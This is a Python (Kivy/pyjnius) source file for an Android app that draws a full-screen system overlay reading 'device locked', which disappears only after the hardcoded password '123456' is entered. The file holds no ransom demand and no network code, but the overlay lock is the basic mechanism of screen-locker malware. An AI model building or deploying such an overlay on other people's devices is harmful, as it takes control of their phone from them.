# main.py
# 终极优化版：内置图片读取 + 悬浮窗锁机 + 密码验证
# 依赖：kivy, pyjnius, android

import os
from kivy.app import App
from kivy.clock import Clock
from kivy.resources import resource_find
from jnius import autoclass, cast
from android import mActivity
from android.permissions import request_permissions, Permission

# 获取 Android 原生类
WindowManager = autoclass('android.view.WindowManager')
LayoutParams = autoclass('android.view.WindowManager$LayoutParams')
Gravity = autoclass('android.view.Gravity')
PixelFormat = autoclass('android.graphics.PixelFormat')
FrameLayout = autoclass('android.widget.FrameLayout')
LinearLayout = autoclass('android.widget.LinearLayout')
TextView = autoclass('android.widget.TextView')
Button = autoclass('android.widget.Button')
EditText = autoclass('android.widget.EditText')
ImageView = autoclass('android.widget.ImageView')
BitmapFactory = autoclass('android.graphics.BitmapFactory')
InputType = autoclass('android.text.InputType')
Toast = autoclass('android.widget.Toast')
Build = autoclass('android.os.Build')

# 设置密码
PASSWORD = "123456"

# 🌟 核心优化：获取内置图片的真实路径
# 这样打包进 APK 后，无论手机系统多新，都能读到图！
BG_IMAGE_PATH = resource_find('shizuku.jpg')

class LockApp(App):
    def on_start(self):
        # 请求悬浮窗权限
        request_permissions([Permission.SYSTEM_ALERT_WINDOW])
        Clock.schedule_once(self.create_overlay, 2)

    def create_overlay(self, dt):
        self.wm = mActivity.getSystemService(mActivity.WINDOW_SERVICE)

        if Build.VERSION.SDK_INT >= 26:
            window_type = LayoutParams.TYPE_APPLICATION_OVERLAY
        else:
            window_type = LayoutParams.TYPE_PHONE

        # 强制允许焦点（为了打字）
        params = LayoutParams(
            LayoutParams.MATCH_PARENT,
            LayoutParams.MATCH_PARENT,
            window_type,
            LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        )
        params.gravity = Gravity.TOP | Gravity.LEFT

        # 1. 根布局
        self.root_layout = FrameLayout(mActivity)

        # 2. 背景图片
        self.bg_image = ImageView(mActivity)
        self.bg_image.setScaleType(ImageView.ScaleType.CENTER_CROP)
        
        try:
            # 如果图片找到了，就加载；否则防止崩溃
            if BG_IMAGE_PATH and os.path.exists(BG_IMAGE_PATH):
                bitmap = BitmapFactory.decodeFile(BG_IMAGE_PATH)
                if bitmap:
                    self.bg_image.setImageBitmap(bitmap)
                else:
                    self.root_layout.setBackgroundColor(0xFF000000)
            else:
                self.root_layout.setBackgroundColor(0xFF000000)
        except Exception as e:
            print("加载图片失败:", e)
            self.root_layout.setBackgroundColor(0xFF000000)
        
        self.root_layout.addView(self.bg_image)

        # 3. 居中控件层（半透明黑底，保护文字看不清）
        self.content_layout = LinearLayout(mActivity)
        self.content_layout.setOrientation(LinearLayout.VERTICAL)
        self.content_layout.setGravity(Gravity.CENTER)
        self.content_layout.setBackgroundColor(0x88000000) # 50%透明度的黑色

        # 提示文字
        tv = TextView(mActivity)
        tv.setText("设备已锁定\n请输入密码解锁")
        tv.setTextColor(0xFFFFFFFF)
        tv.setTextSize(24)
        tv.setGravity(Gravity.CENTER)
        self.content_layout.addView(tv)

        # 密码输入框（优化了边距和大小）
        self.et = EditText(mActivity)
        self.et.setHint("请输入密码")
        self.et.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD)
        self.et.setTextColor(0xFFFFFFFF)
        self.et.setHintTextColor(0xFFCCCCCC)
        lp = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        )
        lp.setMargins(80, 40, 80, 40) # 左右留白80，让输入框居中
        self.et.setLayoutParams(lp)
        self.content_layout.addView(self.et)

        # 解锁按钮
        btn = Button(mActivity)
        btn.setText("解  锁")
        btn.setTextSize(20)
        btn.setOnClickListener(self.unlock)
        self.content_layout.addView(btn)

        # 将控件层加入最外层
        self.root_layout.addView(self.content_layout)

        # 添加悬浮窗
        self.wm.addView(self.root_layout, params)

    def unlock(self, v):
        entered = self.et.getText().toString()
        if entered == PASSWORD:
            if self.root_layout:
                self.wm.removeView(self.root_layout)
                self.root_layout = None
            self.stop()
        else:
            # 密码错误时的震动反馈（可选，需要请求VIBRATE权限，当前不强制加）
            Toast.makeText(mActivity, "密码错误，请重试", Toast.LENGTH_SHORT).show()

if __name__ == '__main__':
    LockApp().run()